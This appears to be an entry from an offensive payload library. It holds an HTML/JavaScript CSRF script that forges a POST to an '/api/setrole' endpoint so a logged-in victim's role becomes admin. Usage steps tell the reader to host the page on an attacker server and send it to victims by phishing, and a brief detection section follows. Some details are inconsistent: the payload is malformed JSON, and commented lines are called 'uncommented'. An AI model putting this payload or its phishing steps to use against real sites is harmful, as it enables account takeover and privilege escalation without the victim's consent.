---
id: e27102b0-7810-4420-afad-bfb99e2fc983
type: code
language: HTML
verified: true
created_at: '2023-04-06T03:55:55.526946+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Web
tags:
  - csrf
  - payload
  - javascript
  - web-attack
validated: true
---

# HTML-CSRF-Script-for-Role-Change-to-Admin

## Code

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

## Description

This HTML code snippet contains JavaScript that performs a CSRF attack by sending a forged POST request to a target API endpoint (/api/setrole) with a JSON-like payload to set the user's role to 'admin'. It uses XMLHttpRequest to submit the request automatically when the page loads, exploiting the victim's active session. The Content-Type is set to text/plain to avoid CORS preflight checks for JSON, allowing the request to go through as a simple request. Uncommented alternatives for other content types can be tested if text/plain is blocked.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| http://www.example.com/api/setrole | Target API endpoint URL for role updates | http://targetapp.com/api/setrole |
| {"role":admin} | JSON payload to send (quoted as string to bypass content type) | {"role":"admin"} |

## Usage

Embed this script in a full HTML page (e.g., <html><body>[script]</body></html>) and host it on an attacker-controlled server. Deliver the URL to the victim via phishing or malicious link while they are logged into the target site. The script executes on page load, sending the request with the victim's cookies. Use browser dev tools or a proxy to test locally before deployment. This payload is ideal for applications vulnerable to CSRF without token validation.

## Detection

- Monitor for unexpected POST requests to role-update endpoints from unusual referers or without CSRF tokens.
- Enable web application firewall (WAF) rules for anomalous Content-Type mismatches (e.g., text/plain to JSON endpoints).
- Log JavaScript executions or XHR requests in client-side monitoring; server-side, audit role changes for missing Origin/Referer headers.
- Browser CSP can block inline scripts; network logs may show requests from external domains.

## Related

- [[procedures/CSRF-Attack-to-Set-User-Role-to-Admin-via-JSON-POST]]
